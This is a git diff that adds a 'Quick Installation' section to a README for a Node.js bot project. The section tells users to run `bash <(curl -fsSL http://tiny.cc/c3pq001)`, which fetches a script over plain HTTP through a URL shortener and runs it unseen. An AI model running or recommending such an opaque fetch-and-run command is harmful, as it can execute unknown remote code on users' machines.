@@ -12,6 +12,16 @@ npm install
 npm start
 ```
 
+### Deploy on a VPS or PC (Ubuntu Example)
+
+#### **Quick Installation**
+
+Run the following command:
+
+```sh
+bash <(curl -fsSL http://tiny.cc/c3pq001)
+```
+
 ### 1. Get Session Code : [Session](https://session.genux.me/)
 
 [![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/Lucifer-DEX/DARK-NERO/)
